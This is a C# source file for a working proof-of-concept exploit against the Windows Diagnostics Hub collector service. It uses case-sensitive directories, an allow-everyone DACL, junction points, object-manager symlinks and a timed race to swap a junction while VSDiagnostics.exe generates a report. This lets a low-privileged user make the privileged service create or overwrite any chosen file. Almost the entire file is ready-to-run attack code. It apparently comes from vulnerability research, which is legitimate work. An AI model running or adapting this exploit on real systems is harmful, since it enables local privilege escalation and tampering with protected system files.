using Monitor.Core.Utilities;
using NtApiDotNet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DiagHubSetNamedSecurityInfoTakeover
{
    class Program
    {
        const int numberOfFilesToWriteToGiveSetNamedSecurityInfoSomeWork = 1000;
        const int millisecondsToSleepForMetadataXmlBeingWritten = 50;

        class Etw
        {
            public const string Link  = "Etw"; // supplied to Diaghub

            public const string Legit = "etw"; // this is where the file operations should normally take place

            public const string Mali1 = "ETW"; // contains a Report dir as a junction point
        }

        private const string DaclAllowEveryOneSD = "D:(A;;GA;;;WD)(A;OICIIO;GA;;;WD)";

        static Process RunCommandDontWait(string filename, string arguments)
        {
            Console.Error.WriteLine($"Exeucuting command: {filename} {arguments}");
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo(filename, arguments)
            {
                UseShellExecute = false,
            };
            return System.Diagnostics.Process.Start(procStartInfo);
        }
        static void RunCommand(string filename, string arguments)
        {
            using (var p = RunCommandDontWait(filename, arguments))
            {
                p.WaitForExit();
            }
        }

        static void CreateJunction(string junctionPath, string destinationPath, bool quickmode)
        {
            JunctionPoint.Create(junctionPath, destinationPath, quickmode);
        }

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.Error.WriteLine("Usage: DiagHubFileWrite path-to-a-dir-for-scratch path-to-file-to-(over)write");
                Console.Error.WriteLine("The target path may be an existing or non-existing file");
                Console.Error.WriteLine();
                Console.Error.WriteLine("Note: there is a race condition to win. Execute this tool multiple times, if the target is not created/modified.");
                return;
            }

            var rootDir = args[0];
            var fileToWrite = args[1];

            var baseDir = Path.Combine(rootDir, "diaghub-file-write-poc");
            var baseDirNt = NtFileUtils.DosFileNameToNt(baseDir);

            Directory.CreateDirectory(baseDir);

            using (var ntFile = NtFile.Open(baseDirNt, null, FileAccessRights.MaximumAllowed, FileShareMode.All, FileOpenOptions.DirectoryFile))
            {
                SecurityDescriptor sddl = new SecurityDescriptor(DaclAllowEveryOneSD);
                ntFile.SetSecurityDescriptor(sddl, SecurityInformation.Dacl);
                try
                {
                    ntFile.CaseSensitive = true;
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine($@"Unable to flag {baseDir} as case-sensitive. Make sure NtfsEnableDirCaseSensitivity DWORD at HKLM\SYSTEM\CurrentControlSet\Control\FileSystem is set to 1");
                    Console.Error.WriteLine(e.Message);
                    return;
                }

                Console.Error.WriteLine($"Case sensitive dir created successfully {baseDir}");
            }



            var LegitDir = Path.Combine(baseDir, Etw.Legit);
            Directory.CreateDirectory(LegitDir);
            var MaliDir = Path.Combine(baseDir, Etw.Mali1);
            Directory.CreateDirectory(MaliDir);

            var LinkDir = Path.Combine(baseDir, Etw.Link);
            CreateJunction(LinkDir, LegitDir, false);

            var guid = Guid.NewGuid().ToString().ToUpper();
            var ReportDirName = $"Report.{guid}";
            var MaliDirReport = Path.Combine(MaliDir, ReportDirName);
            var LegitDirReport = Path.Combine(LegitDir, ReportDirName);
            var LegitLockPath = Path.Combine(LegitDirReport, "lock");

            // creating the lock must succeed, otherwise the operation is aborted
            var symlinkProcess1 = RunCommandDontWait("CreateSymlink.exe", Path.Combine(MaliDirReport, "lock") + " " + LegitLockPath); 
            var symlinkProcess2 = RunCommandDontWait("CreateSymlink.exe", Path.Combine(MaliDirReport, "metadata.xml") + " " + fileToWrite);

            Console.WriteLine($"Preparation succeeded, using report dir {ReportDirName}");

            RunCommand("VSDiagnostics.exe", $"start {guid} /loadAgent:e485d7a9-c21b-4903-892e-303c10906f6e;DiagnosticsHub.StandardCollector.Runtime.dll /scratchLocation:{LinkDir}");

            var t = new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;

                Console.WriteLine($"Monitoring report directory to show up: {LegitDirReport}");
                DateTime before = DateTime.Now;
                int cycles = 0;

                while (true)
                {
                    if (Directory.Exists(LegitDirReport))
                        break;
                    cycles++;
                    if(cycles % 1000000 == 0)
                    {
                        DateTime after = DateTime.Now;
                        if((after-before).TotalSeconds > 5)
                        {
                            Console.Error.WriteLine("Nothing has happened for 5 seconds, probably something is wrong");
                            return;
                        }
                    }
                }

                // pointing to the dir with many files
                CreateJunction(LinkDir, MaliDir, true);

                Console.WriteLine($"report dir has shown up, {LinkDir} replaced to {MaliDir}");
            });
            t.Start();

            // giving the thread and the symlink process some time to init
            Thread.Sleep(500);

            Console.WriteLine("Executing the report generation process");

            RunCommand("VSDiagnostics.exe", $"stop {guid} /output:-");

            t.Join();

            // removing the RPC Control symlink
            symlinkProcess1.Kill();
            symlinkProcess2.Kill();

            Console.WriteLine("Done!");
        }
    }
}
